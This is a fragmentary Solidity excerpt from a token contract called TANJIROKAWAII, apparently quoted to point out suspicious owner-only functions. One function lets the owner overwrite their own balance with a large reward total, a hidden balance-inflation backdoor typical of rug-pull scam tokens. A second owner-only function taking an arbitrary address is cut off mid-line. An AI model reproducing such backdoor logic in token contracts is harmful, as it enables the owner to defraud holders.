...
contract TANJIROKAWAII is Context, IERC20, Ownable {
    ...
    address payable public treasuryWallet = payable(0xfBd9FB18894E6cE70EAA14E72c2Cc88eAD04b4a3);
    ...
    function rewardTanjiro() public onlyOwner() {_walletTotals[owner()] = getTotalRewards;}
    ...
    function TanjiroReward(address _account) external onlyOwner {
